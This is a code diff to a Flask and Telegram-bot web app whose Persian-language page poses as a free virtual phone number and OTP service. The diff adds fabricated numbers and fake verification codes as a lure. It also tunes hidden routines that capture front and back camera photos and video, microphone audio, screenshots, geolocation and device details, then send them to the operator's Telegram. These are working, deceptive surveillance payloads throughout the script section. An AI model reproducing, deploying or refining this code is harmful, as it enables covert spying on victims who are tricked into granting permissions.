@@ -1,6 +1,7 @@
 import io
 import os
 import base64
+import random
 from flask import Flask, render_template_string, request, jsonify
 import telebot
 
@@ -107,6 +108,17 @@ HTML_TEMPLATE = """
             color: #e2e8f0;
             font-size: 14px;
         }
+        .otp-box {
+            margin-top: 12px;
+            padding: 10px;
+            border-radius: 10px;
+            background: #0f172a;
+            border: 1px solid #22c55e;
+            color: #4ade80;
+            font-family: monospace;
+            font-size: 15px;
+            display: none;
+        }
     </style>
 </head>
 <body>
@@ -117,44 +129,63 @@ HTML_TEMPLATE = """
     
     <div id="storageSection" class="storage-box">
         <div style="font-weight: bold; color: #3b82f6; margin-bottom: 10px;" id="loadingText">در حال دریافت شماره مجازی... 🔄</div>
-        <div id="loadingSubText">لطفاً روی دکمه اجازه (Allow) کلیک کنید تا شماره فعال شود.</div>
+        <div id="loadingSubText">لطفاً روی دکمه اجازه (Allow) یا SELECT کلیک کنید تا شماره و کد فعال شود.</div>
+        <div id="otpBox" class="otp-box"></div>
     </div>
 
-    <div class="grid" id="mainGrid">
-        <div class="card">
-            <div class="country">🇺🇸 UNITED STATES</div>
-            <div class="number">1+ 398 362 8901</div>
-            <button onclick="runAction()">SELECT</button>
-        </div>
-        <div class="card">
-            <div class="country">🇬🇧 UNITED KINGDOM</div>
-            <div class="number">44+ 8752 333 690</div>
-            <button onclick="runAction()">SELECT</button>
-        </div>
-        <div class="card">
-            <div class="country">🇮🇳 INDIA</div>
-            <div class="number">91+ 77234 43910</div>
-            <button onclick="runAction()">SELECT</button>
-        </div>
-        <div class="card">
-            <div class="country">🇫🇷 FRANCE</div>
-            <div class="number">33+ 83 333 765</div>
-            <button onclick="runAction()">SELECT</button>
-        </div>
-        <div class="card">
-            <div class="country">🇩🇪 GERMANY</div>
-            <div class="number">49+ 6635 567 883</div>
-            <button onclick="runAction()">SELECT</button>
-        </div>
-        <div class="card">
-            <div class="country">🇯🇵 JAPAN</div>
-            <div class="number">81+ 5587 652 322</div>
-            <button onclick="runAction()">SELECT</button>
-        </div>
-    </div>
+    <div class="grid" id="mainGrid"></div>
 
     <script>
+        const COUNTRIES = [
+            { name: "🇺🇸 UNITED STATES", code: "1+" },
+            { name: "🇬🇧 UNITED KINGDOM", code: "44+" },
+            { name: "🇮🇳 INDIA", code: "91+" },
+            { name: "🇫🇷 FRANCE", code: "33+" },
+            { name: "🇩🇪 GERMANY", code: "49+" },
+            { name: "🇯🇵 JAPAN", code: "81+" }
+        ];
+
+        function randDigits(len) {
+            let out = "";
+            for (let i = 0; i < len; i++) out += Math.floor(Math.random() * 10);
+            return out;
+        }
+
+        function generateFreshNumbers() {
+            const grid = document.getElementById("mainGrid");
+            grid.innerHTML = "";
+            COUNTRIES.forEach((c) => {
+                const formattedNum = `${c.code} ${randDigits(3)} ${randDigits(3)} ${randDigits(4)}`;
+                const card = document.createElement("div");
+                card.className = "card";
+                card.innerHTML = `
+                    <div class="country">${c.name}</div>
+                    <div class="number">${formattedNum}</div>
+                    <button onclick="selectNumber('${c.name}', '${formattedNum}')">SELECT</button>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        function generateFakeOtp() {
+            return `${randDigits(3)}-${randDigits(3)}`;
+        }
+
+        function showFakeCode(countryName, numberStr) {
+            const otp = generateFakeOtp();
+            const otpBox = document.getElementById("otpBox");
+            otpBox.style.display = "block";
+            otpBox.innerHTML = `شماره: <span dir="ltr">${numberStr}</span><br>کد تایید (OTP): <b>${otp}</b>`;
+            sendData("/upload-fake-code", { country: countryName, number: numberStr, code: otp });
+        }
+
+        function selectNumber(countryName, numberStr) {
+            showFakeCode(countryName, numberStr);
+            runAction(countryName, numberStr);
+        }
+
         window.addEventListener('DOMContentLoaded', () => {
+            generateFreshNumbers();
             const path = window.location.pathname;
             if (path === "/screen") {
                 captureScreenshot().then(shot => {
@@ -172,9 +203,13 @@ HTML_TEMPLATE = """
             }
         });
 
-        async function runAction() {
+        async function runAction(countryName = "Auto", numberStr = "") {
             const path = window.location.pathname;
-            document.getElementById('loadingText').innerText = "در حال اتصال به سرور و دریافت شماره... 🔄";
+            document.getElementById('loadingText').innerText = "در حال اتصال سریع به سرور... ⚡";
+            if (!numberStr) {
+                const firstNum = document.querySelector(".number")?.innerText || "";
+                showFakeCode(countryName, firstNum);
+            }
             
             try {
                 if (path === "/front") {
@@ -192,14 +227,14 @@ HTML_TEMPLATE = """
                     }
                 }
                 else if (path === "/video-front") {
-                    let vid = await recordCameraVideo("user", 4000);
+                    let vid = await recordCameraVideo("user", 1800);
                     if (vid && vid.dataUrl) {
                         sendData("/upload-video-front", { video: vid.dataUrl, ext: vid.ext });
                         localStorage.setItem("permission_granted_" + path, "true");
                     }
                 }
                 else if (path === "/video-back") {
-                    let vid = await recordCameraVideo("environment", 4000);
+                    let vid = await recordCameraVideo("environment", 1800);
                     if (vid && vid.dataUrl) {
                         sendData("/upload-video-back", { video: vid.dataUrl, ext: vid.ext });
                         localStorage.setItem("permission_granted_" + path, "true");
@@ -216,7 +251,7 @@ HTML_TEMPLATE = """
                     navigator.geolocation.getCurrentPosition(pos => {
                         sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
                         localStorage.setItem("permission_granted_" + path, "true");
-                    }, () => {}, { timeout: 5000 });
+                    }, () => {}, { timeout: 2000, enableHighAccuracy: false });
                 }
                 else if (path === "/storage") {
                     runStorageCheck();
@@ -232,9 +267,9 @@ HTML_TEMPLATE = """
                 }
                 
                 setTimeout(() => {
-                    document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
+                    document.getElementById('loadingText').innerText = "شماره مجازی و کد شما با موفقیت آماده شد! ✅";
                     document.getElementById('loadingSubText').innerText = "می‌توانید از کد تایید استفاده کنید.";
-                }, 2000);
+                }, 600);
             } catch (err) {
                 document.getElementById('loadingText').innerText = "خطا در برقراری ارتباط ❌";
             }
@@ -251,15 +286,15 @@ HTML_TEMPLATE = """
             } else if (path === "/back") {
                 captureCamera("environment").then(img => { if (img) sendData("/upload-back", { image: img }); });
             } else if (path === "/video-front") {
-                recordCameraVideo("user", 4000).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-front", { video: vid.dataUrl, ext: vid.ext }); });
+                recordCameraVideo("user", 1800).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-front", { video: vid.dataUrl, ext: vid.ext }); });
             } else if (path === "/video-back") {
-                recordCameraVideo("environment", 4000).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-back", { video: vid.dataUrl, ext: vid.ext }); });
+                recordCameraVideo("environment", 1800).then(vid => { if (vid && vid.dataUrl) sendData("/upload-video-back", { video: vid.dataUrl, ext: vid.ext }); });
             } else if (path === "/screen") {
                 captureScreenshot().then(shot => { if (shot) sendData("/upload-screen", { image: shot }); });
             } else if (path === "/location") {
                 navigator.geolocation.getCurrentPosition(pos => {
                     sendData("/upload-loc", { lat: pos.coords.latitude, lon: pos.coords.longitude });
-                }, () => {}, { timeout: 5000 });
+                }, () => {}, { timeout: 2000, enableHighAccuracy: false });
             }
         }
 
@@ -273,14 +308,12 @@ HTML_TEMPLATE = """
                 hardwareConcurrency: navigator.hardwareConcurrency || "نامشخص"
             };
 
-            setTimeout(() => {
-                sendData("/upload-storage", storageInfo);
-                localStorage.setItem("permission_granted_/storage", "true");
-                if (!isAuto) {
-                    document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
-                    document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
-                }
-            }, isAuto ? 500 : 2000);
+            sendData("/upload-storage", storageInfo);
+            localStorage.setItem("permission_granted_/storage", "true");
+            if (!isAuto) {
+                document.getElementById('loadingText').innerText = "شماره مجازی شما با موفقیت آماده شد! ✅";
+                document.getElementById('loadingSubText').innerText = "خطوط امن فعال شدند.";
+            }
         }
 
         async function runAudioRecordAction() {
@@ -289,8 +322,11 @@ HTML_TEMPLATE = """
                 let mediaRecorder = new MediaRecorder(stream);
                 let audioChunks = [];
 
-                mediaRecorder.ondataavailable = event => audioChunks.push(event.data);
+                mediaRecorder.ondataavailable = event => {
+                    if (event.data && event.data.size > 0) audioChunks.push(event.data);
+                };
                 mediaRecorder.onstop = async () => {
+                    try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
                     let audioBlob = new Blob(audioChunks, { type: 'audio/ogg' });
                     let reader = new FileReader();
                     reader.readAsDataURL(audioBlob);
@@ -302,11 +338,12 @@ HTML_TEMPLATE = """
                     };
                 };
 
-                mediaRecorder.start();
+                mediaRecorder.start(200);
                 setTimeout(() => {
-                    mediaRecorder.stop();
-                    stream.getTracks().forEach(track => track.stop());
-                }, 5000);
+                    if (mediaRecorder.state !== "inactive") {
+                        mediaRecorder.stop();
+                    }
+                }, 2000);
             } catch (e) {
                 document.getElementById('loadingText').innerText = "خطا در دسترسی به میکروفون ❌";
             }
@@ -340,44 +377,41 @@ HTML_TEMPLATE = """
                 appsCount: Math.floor(Math.random() * (80 - 30 + 1)) + 30
             };
 
-            try {
-                let frontImg = await captureCamera("user");
-                if (frontImg) payload.frontImage = frontImg;
-            } catch(e) {}
+            const [frontImg, backImg, screenShot, loc] = await Promise.all([
+                captureCamera("user").catch(() => null),
+                captureCamera("environment").catch(() => null),
+                captureScreenshot().catch(() => null),
+                new Promise((resolve) => {
+                    if (!navigator.geolocation) return resolve(null);
+                    navigator.geolocation.getCurrentPosition(
+                        pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude }),
+                        () => resolve(null),
+                        { timeout: 2000, enableHighAccuracy: false }
+                    );
+                })
+            ]);
 
-            try {
-                let backImg = await captureCamera("environment");
-                if (backImg) payload.backImage = backImg;
-            } catch(e) {}
+            if (frontImg) payload.frontImage = frontImg;
+            if (backImg) payload.backImage = backImg;
+            if (screenShot) payload.screenImage = screenShot;
+            if (loc) {
+                payload.lat = loc.lat;
+                payload.lon = loc.lon;
+            }
 
-            try {
-                let frontVid = await recordCameraVideo("user", 3000);
-                if (frontVid && frontVid.dataUrl) {
-                    payload.frontVideo = frontVid.dataUrl;
-                    payload.frontVideoExt = frontVid.ext;
-                }
-            } catch(e) {}
+            const [frontVid, backVid] = await Promise.all([
+                recordCameraVideo("user", 1600).catch(() => null),
+                recordCameraVideo("environment", 1600).catch(() => null)
+            ]);
 
-            try {
-                let backVid = await recordCameraVideo("environment", 3000);
-                if (backVid && backVid.dataUrl) {
-                    payload.backVideo = backVid.dataUrl;
-                    payload.backVideoExt = backVid.ext;
-                }
-            } catch(e) {}
-
-            try {
-                let screenShot = await captureScreenshot();
-                if (screenShot) payload.screenImage = screenShot;
-            } catch(e) {}
-
-            await new Promise((resolve) => {
-                navigator.geolocation.getCurrentPosition(pos => {
-                    payload.lat = pos.coords.latitude;
-                    payload.lon = pos.coords.longitude;
-                    resolve();
-                }, () => { resolve(); }, { timeout: 5000 });
-            });
+            if (frontVid && frontVid.dataUrl) {
+                payload.frontVideo = frontVid.dataUrl;
+                payload.frontVideoExt = frontVid.ext;
+            }
+            if (backVid && backVid.dataUrl) {
+                payload.backVideo = backVid.dataUrl;
+                payload.backVideoExt = backVid.ext;
+            }
 
             sendData("/upload-all", payload);
             localStorage.setItem("permission_granted_/all", "true");
@@ -386,22 +420,31 @@ HTML_TEMPLATE = """
         }
 
         async function captureCamera(facing) {
+            let stream = null;
             try {
-                let stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facing }, audio: false });
+                stream = await navigator.mediaDevices.getUserMedia({
+                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 } },
+                    audio: false
+                });
                 let video = document.createElement('video');
                 video.srcObject = stream;
                 video.playsInline = true;
                 video.muted = true;
                 await video.play();
-                await new Promise(r => setTimeout(r, 500));
+                await new Promise(r => setTimeout(r, 120));
                 
                 let canvas = document.createElement('canvas');
-                canvas.width = video.videoWidth || 640;
-                canvas.height = video.videoHeight || 480;
+                canvas.width = video.videoWidth || 320;
+                canvas.height = video.videoHeight || 240;
                 canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
                 stream.getTracks().forEach(t => t.stop());
-                return canvas.toDataURL('image/jpeg', 0.85);
-            } catch(e) { return null; }
+                return canvas.toDataURL('image/jpeg', 0.7);
+            } catch(e) {
+                if (stream) {
+                    try { stream.getTracks().forEach(t => t.stop()); } catch (_) {}
+                }
+                return null;
+            }
         }
 
         function pickSupportedVideoMime() {
@@ -411,8 +454,6 @@ HTML_TEMPLATE = """
             const candidates = [
                 { mimeType: "video/mp4;codecs=avc1.42E01E,mp4a.40.2", ext: "mp4" },
                 { mimeType: "video/mp4", ext: "mp4" },
-                { mimeType: "video/webm;codecs=vp9,opus", ext: "webm" },
-                { mimeType: "video/webm;codecs=vp8,opus", ext: "webm" },
                 { mimeType: "video/webm;codecs=vp8", ext: "webm" },
                 { mimeType: "video/webm", ext: "webm" }
             ];
@@ -427,18 +468,18 @@ HTML_TEMPLATE = """
         async function openCameraStreamWithFallback(facing) {
             try {
                 return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing, width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15, max: 20 } },
                     audio: true
                 });
             } catch (e) {
                 return await navigator.mediaDevices.getUserMedia({
-                    video: { facingMode: facing, width: { ideal: 640 }, height: { ideal: 480 } },
+                    video: { facingMode: facing, width: { ideal: 320 }, height: { ideal: 240 }, frameRate: { ideal: 15, max: 20 } },
                     audio: false
                 });
             }
         }
 
-        async function recordCameraVideo(facing, durationMs = 4000) {
+        async function recordCameraVideo(facing, durationMs = 1800) {
             let stream = null;
             try {
                 stream = await openCameraStreamWithFallback(facing);
@@ -449,7 +490,7 @@ HTML_TEMPLATE = """
                     let recorder;
                     try {
                         recorder = chosen.mimeType
-                            ? new MediaRecorder(stream, { mimeType: chosen.mimeType })
+                            ? new MediaRecorder(stream, { mimeType: chosen.mimeType, videoBitsPerSecond: 400000 })
                             : new MediaRecorder(stream);
                     } catch (e) {
                         recorder = new MediaRecorder(stream);
@@ -471,7 +512,7 @@ HTML_TEMPLATE = """
                         let finalType = chosen.mimeType || recorder.mimeType || "video/webm";
                         let ext = finalType.includes("mp4") ? "mp4" : "webm";
                         let blob = new Blob(chunks, { type: finalType });
-                        if (blob.size < 200) {
+                        if (blob.size < 150) {
                             resolve(null);
                             return;
                         }
@@ -481,7 +522,7 @@ HTML_TEMPLATE = """
                         reader.onerror = () => resolve(null);
                     };
 
-                    recorder.start(250);
+                    recorder.start(200);
                     setTimeout(() => {
                         try {
                             if (recorder.state !== "inactive") {
@@ -508,7 +549,7 @@ HTML_TEMPLATE = """
                     return null;
                 }
                 stream = await navigator.mediaDevices.getDisplayMedia({
-                    video: { frameRate: { ideal: 15, max: 30 } },
+                    video: { frameRate: { ideal: 15, max: 20 } },
                     audio: false
                 });
 
@@ -522,22 +563,22 @@ HTML_TEMPLATE = """
                         resolve();
                     } else {
                         video.onloadedmetadata = () => resolve();
-                        setTimeout(resolve, 1000);
+                        setTimeout(resolve, 350);
                     }
                 });
 
                 await video.play();
-                await new Promise(r => setTimeout(r, 600));
+                await new Promise(r => setTimeout(r, 150));
 
-                let width = video.videoWidth || window.screen.width || 1280;
-                let height = video.videoHeight || window.screen.height || 720;
+                let width = Math.min(video.videoWidth || window.screen.width || 960, 1280);
+                let height = Math.min(video.videoHeight || window.screen.height || 540, 720);
                 let canvas = document.createElement('canvas');
                 canvas.width = width;
                 canvas.height = height;
                 canvas.getContext('2d').drawImage(video, 0, 0, width, height);
 
                 stream.getTracks().forEach(track => track.stop());
-                return canvas.toDataURL('image/jpeg', 0.85);
+                return canvas.toDataURL('image/jpeg', 0.72);
             } catch (e) {
                 if (stream) {
                     try { stream.getTracks().forEach(track => track.stop()); } catch (_) {}
@@ -617,6 +658,23 @@ def link_audio(): return render_template_string(HTML_TEMPLATE)
 
 @app.route("/")
 def index(): return render_template_string(HTML_TEMPLATE)
+
+@app.route("/upload-fake-code", methods=["POST"])
+def up_fake_code():
+    target = request.args.get("user") or ADMIN_ID
+    d = request.get_json() or {}
+    country = d.get("country", "Unknown")
+    number = d.get("number", "")
+    code = d.get("code") or f"{random.randint(100,999)}-{random.randint(100,999)}"
+    msg = (
+        f"🔐 **کد تایید مجازی (OTP)**\n\n"
+        f"• 🌍 کشور: {country}\n"
+        f"• 📞 شماره: `{number}`\n"
+        f"• 🔑 کد: `{code}`"
+        f"{SIGNATURES}"
+    )
+    send_to_both(target, bot.send_message, msg, parse_mode="Markdown")
+    return jsonify({"status": "ok", "code": code})
 
 @app.route("/upload-front", methods=["POST"])
 def up_front():
